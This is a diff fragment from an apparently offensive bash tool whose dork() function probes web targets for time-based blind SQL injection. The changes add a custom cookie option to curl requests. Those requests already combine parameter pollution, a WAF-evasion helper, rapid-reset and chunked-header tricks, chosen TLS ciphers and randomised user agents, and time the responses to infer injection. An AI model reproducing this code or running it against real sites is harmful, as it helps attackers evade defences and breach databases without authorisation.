@@ -184,8 +184,8 @@ dork() {
 
           local waf_trick=$(braindamage)
           echo -e "\e[0;34m[\e[0m<\e[0;34m]\e[0m Vector 1 [Port:$random_port] Probing Latency on: \e[38;5;236m${target_url}${final_query}\e[0m"
-          curl_output=$(echo -n "${param_name}=999&${param_name}=${param_val}${query_payload}" | \
-            curl $proxy_flag $waf_trick $rapid_reset_args $chunked_headers \
+          curl_output=$(echo -n "${param_name}=999&${param_name}=${param_val}${query_payload}" | \           
+            curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \           
             --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
             -m 12 -A "$random_ua" -s -o /dev/null -d @- \
             -w "%{time_total}|%{http_code}" \
@@ -271,11 +271,11 @@ dork() {
             echo -e "\e[0;34m[\e[0m>\e[0;34m]\e[0m Vector 2 [Port:$random_port] Probing Latency on: \e[38;5;236m${target_url}${final_query}\e[0m"
 
             curl_output=$(echo -n "${param_name}=999&${param_name}=${param_val}${query_payload}" | \
-              curl $proxy_flag $waf_trick $rapid_reset_args $chunked_headers \
-              --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
-              -m 12 -A "$random_ua" -s -o /dev/null -d @- \
-              -w "%{time_total}|%{http_code}" \
-              "${target_url}${default_path}" "${target_url}${default_path}")
+            curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
+            --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
+            -m 12 -A "$random_ua" -s -o /dev/null -d @- \
+            -w "%{time_total}|%{http_code}" \
+            "${target_url}${default_path}" "${target_url}${default_path}")
             local stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
             local http_status=$(echo "$curl_output" | cut -d'|' -f2)
 
@@ -392,6 +392,11 @@ dork() {
                 export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/nerfdef.txt"
               fi
             fi
+          fi
+          cookie_flag=""
+          if [ -n "$custom_cookie" ]; then
+            cookie_flag="-b $custom_cookie"
+            echo "[i] Custom Cookie inputted: $custom_cookie" 
           fi
           echo -e "\n\e[0;34m[\e[0m*\e[0;37m]\e[0m Performing database environment verification.."
 
